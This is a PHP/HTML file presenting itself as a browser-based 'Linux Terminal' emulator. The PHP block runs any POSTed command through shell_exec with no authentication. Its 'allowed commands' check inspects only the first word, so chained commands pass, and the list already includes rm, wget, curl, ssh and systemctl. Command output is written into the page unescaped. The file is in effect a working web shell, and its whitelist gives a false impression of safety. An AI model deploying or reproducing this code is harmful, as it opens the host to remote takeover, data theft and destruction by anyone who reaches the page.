<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Linux Terminal</title>
    <style>
        body {
            margin: 0;
            padding: 10px;
            background: #1a1a1a;
            color: #33ff33;
            font-family: monospace;
        }
        #terminal {
            background: #000;
            padding: 15px;
            height: 85vh;
            overflow-y: auto;
            border-radius: 5px;
            position: relative;
        }
        #output {
            white-space: pre-wrap;
            margin-bottom: 20px;
            font-size: 14px;
        }
        #input-line {
            display: flex;
            position: sticky;
            bottom: 0;
            background: #000;
            padding: 5px 0;
        }
        #prompt {
            color: #00ff00;
            margin-right: 8px;
        }
        #command-input {
            flex-grow: 1;
            background: transparent;
            border: none;
            color: #33ff33;
            font-family: monospace;
            font-size: 14px;
            outline: none;
        }
        .error {
            color: #ff3333;
        }
    </style>
</head>
<body>
    <div id="terminal">
        <div id="output"></div>
        <div id="input-line">
            <span id="prompt">$</span>
            <input type="text" id="command-input" autofocus>
        </div>
    </div>

    <?php
    if (isset($_POST['cmd'])) {
        $command = $_POST['cmd'];
        
        // Whitelist command yang diperbolehkan
        $allowed_commands = array(
            'ls', 'cd', 'pwd', 'cat', 'echo', 'mkdir', 'rm', 'rmdir', 
            'cp', 'mv', 'touch', 'grep', 'find', 'ps', 'df', 'du',
            'free', 'top', 'uname', 'whoami', 'date', 'cal', 'clear',
            'head', 'tail', 'less', 'more', 'wc', 'sort', 'uniq',
            'tar', 'gzip', 'gunzip', 'zip', 'unzip', 'wget', 'curl',
            'ping', 'netstat', 'ifconfig', 'ip', 'ssh', 'scp',
            'apt', 'apt-get', 'dpkg', 'systemctl', 'service',
            'git', 'nano', 'vim', 'neofetch'
        );

        $cmd_base = explode(' ', $command)[0];
        
        // Special handling untuk cd karena PHP shell_exec tidak bisa mengubah directory
        if ($cmd_base === 'cd') {
            $dir = substr($command, 3);
            if (chdir($dir)) {
                echo getcwd();
            } else {
                echo "cd: No such directory: $dir";
            }
            exit;
        }
        
        // Special handling untuk clear
        if ($command === 'clear') {
            echo "CLEAR_SCREEN";
            exit;
        }

        // Eksekusi command jika diizinkan
        if (in_array($cmd_base, $allowed_commands)) {
            $output = shell_exec($command . " 2>&1");
            echo $output !== null ? $output : "Command executed with no output";
        } else {
            echo "Command not allowed. Type 'help' for list of allowed commands.";
        }
        exit;
    }
    ?>

    <script>
        const terminal = document.getElementById('terminal');
        const output = document.getElementById('output');
        const commandInput = document.getElementById('command-input');
        const prompt = document.getElementById('prompt');
        
        let commandHistory = [];
        let historyIndex = -1;
        let currentDirectory = '';

        // Update prompt dengan current directory
        function updatePrompt() {
            executeCommand('pwd', true).then(pwd => {
                currentDirectory = pwd.trim();
                prompt.textContent = `${currentDirectory}$`;
            });
        }

        async function executeCommand(cmd, isPwd = false) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            
            return new Promise((resolve) => {
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        const response = xhr.responseText;
                        
                        if (!isPwd) {
                            if (response === "CLEAR_SCREEN") {
                                output.innerHTML = '';
                            } else {
                                output.innerHTML += `<div>${currentDirectory}$ ${cmd}</div>`;
                                output.innerHTML += `<div>${response}</div>`;
                            }
                            terminal.scrollTop = terminal.scrollHeight;
                        }
                        resolve(response);
                    }
                };
                
                xhr.send(`cmd=${encodeURIComponent(cmd)}`);
            });
        }

        commandInput.addEventListener('keydown', async function(e) {
            if (e.key === 'Enter') {
                const cmd = this.value.trim();
                if (cmd) {
                    commandHistory.push(cmd);
                    historyIndex = commandHistory.length;
                    await executeCommand(cmd);
                    if (cmd.startsWith('cd ')) {
                        updatePrompt();
                    }
                    this.value = '';
                }
            } else if (e.key === 'ArrowUp') {
                if (historyIndex > 0) {
                    historyIndex--;
                    this.value = commandHistory[historyIndex];
                }
                e.preventDefault();
            } else if (e.key === 'ArrowDown') {
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex];
                } else {
                    historyIndex = commandHistory.length;
                    this.value = '';
                }
                e.preventDefault();
            }
        });

        // Initialize terminal
        output.innerHTML = "Linux Terminal Emulator\nType 'help' for available commands\n\n";
        updatePrompt();
    </script>
</body>
</html>